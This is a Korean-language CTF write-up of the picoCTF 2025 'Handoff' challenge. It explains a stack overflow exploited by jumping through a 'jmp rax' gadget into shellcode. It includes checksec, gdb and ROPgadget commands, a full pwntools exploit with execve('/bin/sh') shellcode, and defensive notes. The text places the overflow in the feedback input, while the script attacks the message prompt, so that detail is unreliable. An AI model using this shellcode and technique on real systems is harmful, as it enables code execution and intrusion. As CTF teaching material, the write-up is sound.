---
title: Handoff — picoCTF 2025 pwn writeup
created: 2026-06-15
updated: 2026-06-15
type: query
tags: [ctf, pwn, buffer-overflow, ret2reg, shellcode, executable-stack, picoctf]
sources: [https://www.ztz0.com/writeups/2025/picoctf/pwn/handoff/, https://recaptcha.team/picoCTF-2025/pwn/Handoff/, https://medium.com/@z.ishan_Ansari/handoff-f6ec74face4d]
confidence: high
---

# Handoff — picoCTF 2025 pwn writeup

> `Handoff`는 **오버플로로 `RIP`를 덮고, `RAX`가 가리키는 공격자 입력(쉘코드)로 점프하는 ret2reg / executable stack 문제**입니다. 핵심은 **stack overflow + `jmp rax` gadget + shellcode execution**입니다.

## 1. 핵심 요약

- 프로그램은 recipient/message/feedback 흐름을 제공합니다.
- 그중 feedback 경로에 **32바이트 입력으로 제어 흐름을 덮는 버퍼 오버플로**가 있습니다.
- 디버깅 시 `RAX`가 공격자 입력을 가리킵니다.
- `jmp rax` 가젯을 찾아 `RIP`를 그쪽으로 덮으면 shellcode로 진입합니다.
- 스택이 실행 가능하므로 `/bin/sh` shellcode를 직접 올릴 수 있습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2025 |
| 분류 | pwn / binary exploitation |
| 핵심 요소 | stack overflow, ret2reg, shellcode, executable stack |
| 취약 지점 | feedback 입력 경로 |
| 목표 | `RAX`가 가리키는 쉘코드로 점프 |

## 3. 공격 흐름

1. `checksec`로 보호기법을 확인합니다.
2. feedback 입력에서 오버플로가 가능함을 확인합니다.
3. `gdb`로 크래시 시 `RAX`가 공격자 입력을 가리키는 것을 관찰합니다.
4. 바이너리에서 `jmp rax` 가젯을 찾습니다.
5. shellcode를 입력 버퍼에 배치합니다.
6. `RIP`를 `jmp rax`로 덮어 shellcode를 실행합니다.

## 4. 핵심 관찰

- `RAX`는 공격자 입력 버퍼 주소를 담고 있었습니다.
- 스택은 실행 가능했고, PIE도 없었습니다.
- 따라서 주소 랜덤화보다 **어느 레지스터로 점프할지**가 더 중요했습니다.

## 5. 실전 확인 예시

```bash
# 바이너리 보호기법을 확인합니다.
checksec ./handoff  # 예상 출력: No PIE, Stack executable/RWX, No canary 등
```

```bash
# RAX와 RIP를 gdb에서 관찰합니다.
gdb -q ./handoff  # 예상: 오버플로 후 RAX가 입력 버퍼를 가리킵니다.
# (gdb 안에서) info registers
```

```bash
# jmp rax 가젯을 찾습니다.
ROPgadget --binary ./handoff | grep 'jmp rax'  # 예상 출력: 0x40116c : jmp rax
```

## 재현 절차
1. feedback 입력에서 오버플로 경계를 찾습니다.
2. `RAX`가 입력 버퍼를 가리키는지 확인합니다.
3. `jmp rax` 가젯을 찾아 shellcode로 점프합니다.

```bash
# 입력 길이와 크래시를 확인합니다.
./handoff

# 레지스터와 가젯을 확인합니다.
gdb -q ./handoff
ROPgadget --binary ./handoff | grep 'jmp rax'
```

## 6. 익스플로잇 개요

```python
# pwntools로 shellcode를 주입하고 jmp rax로 제어를 넘기는 예시입니다.
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./handoff')  # 로컬 바이너리를 로드합니다.
r = process(elf.path)  # 로컬에서 실행합니다.

jmp_rax = 0x40116c  # jmp rax 가젯 주소입니다.

shellcode = asm('''
    xor rsi, rsi          # argv = NULL
    xor rdx, rdx          # envp = NULL
    mov rbx, 0x0068732f6e69622f  # "/bin/sh\0"를 64비트 정수로 준비합니다.
    push rbx              # 스택에 문자열을 올립니다.
    mov rdi, rsp          # rdi = "/bin/sh" 포인터
    mov eax, 59           # execve syscall number
    syscall               # execve("/bin/sh", NULL, NULL)
''')

payload = shellcode.ljust(40, b'\x90')  # RIP overwrite 전까지 NOP 패딩을 넣습니다.
payload += p64(jmp_rax)                 # RIP를 jmp rax로 덮습니다.

r.sendlineafter(b"What's the new recipient's name: ", b'AAAA')  # 예시 상호작용입니다.
r.sendlineafter(b'Which recipient would you like to send a message to?', b'-1')  # 취약 인덱스를 노립니다.
r.sendlineafter(b'What message would you like to send them?', payload)  # shellcode + RIP overwrite를 보냅니다.
r.interactive()  # 쉘을 확보한 뒤 상호작용합니다.
```

## 7. 방어 관점 메모

- 버퍼 오버플로만이 문제가 아니라 **실행 가능 스택**이 결정타였습니다.
- `RAX` 같은 레지스터에 공격자 입력 주소가 들어가면 ret2reg가 쉬워집니다.
- 방어를 위해서는:
  - 입력 길이 검증
  - 스택 NX 활성화
  - PIE/ASLR 활용
  - 가젯 점프 전에 값 검증
  이 필요합니다.

## 8. 비교 포인트

- `PIE TIME`은 **주소 계산형 pwn**입니다.
- `Flag Leak`는 **format string 정보 유출형 pwn**입니다.
- `Handoff`는 **ret2reg + shellcode 실행형 pwn**입니다.

## 9. 참고 자료

- [ztz0 — handoff - picoCTF 2025 Writeup](https://www.ztz0.com/writeups/2025/picoctf/pwn/handoff/)
- [reCAPTCHA the Flag — Handoff](https://recaptcha.team/picoCTF-2025/pwn/Handoff/)
- [ZISHAN ANSARI — HANDOFF PicoCTF’25 Binary Exploitation Writeup](https://medium.com/@z.ishan_Ansari/handoff-f6ec74face4d)
- [[ret2reg-executable-stack-ctf-patterns]]
- [[exploitation]]
